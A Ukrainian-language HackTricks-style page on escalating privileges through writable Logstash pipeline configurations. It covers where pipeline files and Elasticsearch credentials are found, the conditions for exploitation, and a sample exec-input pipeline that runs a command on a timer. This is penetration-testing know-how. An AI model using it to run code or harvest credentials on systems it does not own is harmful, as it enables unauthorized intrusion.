{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash використовується для **збирання, перетворення та відправки логів** через систему, відому як **потоки**. Ці потоки складаються з етапів **входу**, **фільтрації** та **виходу**. Цікавий аспект виникає, коли Logstash працює на скомпрометованій машині.

### Налаштування потоку

Потоки налаштовуються у файлі **/etc/logstash/pipelines.yml**, який містить списки місць розташування конфігурацій потоків:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Цей файл розкриває, де розташовані **.conf** файли, що містять конфігурації конвеєра. При використанні **Elasticsearch output module** зазвичай **конвеєри** включають **Elasticsearch credentials**, які часто мають великі привілеї через необхідність Logstash записувати дані в Elasticsearch. Шаблони в шляхах конфігурації дозволяють Logstash виконувати всі відповідні конвеєри в призначеній директорії.

### Підвищення привілеїв через записувані конвеєри

Щоб спробувати підвищення привілеїв, спочатку визначте користувача, під яким працює служба Logstash, зазвичай це користувач **logstash**. Переконайтеся, що ви відповідаєте **одному** з цих критеріїв:

- Маєте **доступ на запис** до файлу конвеєра **.conf** **або**
- Файл **/etc/logstash/pipelines.yml** використовує шаблон, і ви можете записувати в цільову папку

Крім того, повинна бути виконана **одна** з цих умов:

- Можливість перезапустити службу Logstash **або**
- Файл **/etc/logstash/logstash.yml** має **config.reload.automatic: true** встановленим

З огляду на шаблон у конфігурації, створення файлу, що відповідає цьому шаблону, дозволяє виконувати команди. Наприклад:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Тут **інтервал** визначає частоту виконання в секундах. У наведеному прикладі команда **whoami** виконується кожні 120 секунд, а її вивід направляється до **/tmp/output.log**.

З **config.reload.automatic: true** у **/etc/logstash/logstash.yml**, Logstash автоматично виявлятиме та застосовуватиме нові або змінені конфігурації конвеєра без необхідності перезавантаження. Якщо немає шаблону, зміни все ще можуть бути внесені в існуючі конфігурації, але слід бути обережним, щоб уникнути збоїв.

## References

{{#include ../../banners/hacktricks-training.md}}
